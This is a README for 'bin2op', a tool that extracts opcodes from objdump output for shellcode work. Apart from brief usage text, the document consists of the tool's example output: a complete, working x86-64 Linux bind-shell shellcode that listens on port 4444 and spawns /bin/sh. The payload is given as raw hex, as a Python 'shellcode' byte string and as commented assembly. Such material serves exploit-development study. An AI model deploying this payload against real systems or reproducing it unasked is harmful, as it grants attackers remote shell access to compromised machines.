# bin2op
Extract the opcode from the objdump of a binary

## Usage
```
usage: ./bin2op.py [options]
   -f, --file     The assembly code filename
   -s, --short    Show less version of opcode
   -l, --large    Show verbose version of opcode
   -i, --intel    Use the intel assembly syntax
   -a, --att      Use the AT&T assembly syntax

Example: ./bin2op.py -a -f bindshell/build/bindshell.o -l
         ./bin2op.py -f bindshell/build/bindshell.o -s
```

## Output - short
```asm
\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5f\x52\x52
\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\x54\x5e\x52\x6a\x10
\x5a\x6a\x31\x58\x0f\x05\x5e\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x50
\x5f\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48
\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05
```

## Output - short (python)
```python
shellcode = (
	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a"
	b"\x01\x5e\x0f\x05\x50\x5f\x52\x52"
	b"\xc6\x04\x24\x02\x66\xc7\x44\x24"
	b"\x02\x11\x5c\x54\x5e\x52\x6a\x10"
	b"\x5a\x6a\x31\x58\x0f\x05\x5e\xb0"
	b"\x32\x0f\x05\xb0\x2b\x0f\x05\x50"
	b"\x5f\x6a\x03\x5e\xff\xce\xb0\x21"
	b"\x0f\x05\x75\xf8\x56\x5a\x56\x48"
	b"\xbf\x2f\x2f\x62\x69\x6e\x2f\x73"
	b"\x68\x57\x54\x5f\xb0\x3b\x0f\x05"
)
```

## Output - large
```asm
 "\x6a\x29"                      /* push   0x29 */
 "\x58"                          /* pop    rax */
 "\x99"                          /* cdq */
 "\x6a\x02"                      /* push   0x2 */
 "\x5f"                          /* pop    rdi */
 "\x6a\x01"                      /* push   0x1 */
 "\x5e"                          /* pop    rsi */
 "\x0f\x05"                      /* syscall */
 "\x50"                          /* push   rax */
 "\x5f"                          /* pop    rdi */
 "\x52"                          /* push   rdx */
 "\x52"                          /* push   rdx */
 "\xc6\x04\x24\x02"              /* mov    BYTE PTR [rsp],0x2 */
 "\x66\xc7\x44\x24\x02\x11\x5c"  /* mov    WORD PTR [rsp+0x2],0x5c11 */
 "\x54"                          /* push   rsp */
 "\x5e"                          /* pop    rsi */
 "\x52"                          /* push   rdx */
 "\x6a\x10"                      /* push   0x10 */
 "\x5a"                          /* pop    rdx */
 "\x6a\x31"                      /* push   0x31 */
 "\x58"                          /* pop    rax */
 "\x0f\x05"                      /* syscall */
 "\x5e"                          /* pop    rsi */
 "\xb0\x32"                      /* mov    al,0x32 */
 "\x0f\x05"                      /* syscall */
 "\xb0\x2b"                      /* mov    al,0x2b */
 "\x0f\x05"                      /* syscall */
 "\x50"                          /* push   rax */
 "\x5f"                          /* pop    rdi */
 "\x6a\x03"                      /* push   0x3 */
 "\x5e"                          /* pop    rsi */
 "\xff\xce"                      /* dec    esi */
 "\xb0\x21"                      /* mov    al,0x21 */
 "\x0f\x05"                      /* syscall */
 "\x75\xf8"                      /* jne    34 <dupe_loop> */
 "\x56"                          /* push   rsi */
 "\x5a"                          /* pop    rdx */
 "\x56"                          /* push   rsi */
 "\x48\xbf\x2f\x2f\x62\x69\x6e"  /* movabs rdi,0x68732f6e69622f2f */
 "\x2f\x73\x68"                  /* . */
 "\x57"                          /* push   rdi */
 "\x54"                          /* push   rsp */
 "\x5f"                          /* pop    rdi */
 "\xb0\x3b"                      /* mov    al,0x3b */
 "\x0f\x05"                      /* syscall */
```
